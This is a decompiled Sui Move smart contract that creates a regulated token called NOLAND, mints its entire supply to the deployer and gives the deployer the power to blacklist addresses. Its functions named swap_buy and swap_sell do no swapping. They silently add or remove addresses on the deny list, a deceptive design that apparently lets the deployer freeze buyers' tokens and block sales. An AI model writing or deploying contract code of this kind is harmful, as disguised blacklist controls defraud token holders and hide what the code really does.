module 0x6376fc7dafc81b0974684865b21abd9cc3d1c0b8cded7b4746eef4a2350dc26a::noland {
    struct NOLAND has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: NOLAND, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<NOLAND>(arg0, 9, b"NOLAND", b"The World's First AI Human", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmVCfSxrAZ4FyXa5K2dMj4NaT4MEts8dK56kTCJdqUgyNu"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<NOLAND>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<NOLAND>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<NOLAND>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<NOLAND>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<NOLAND>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<NOLAND>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<NOLAND>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<NOLAND>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

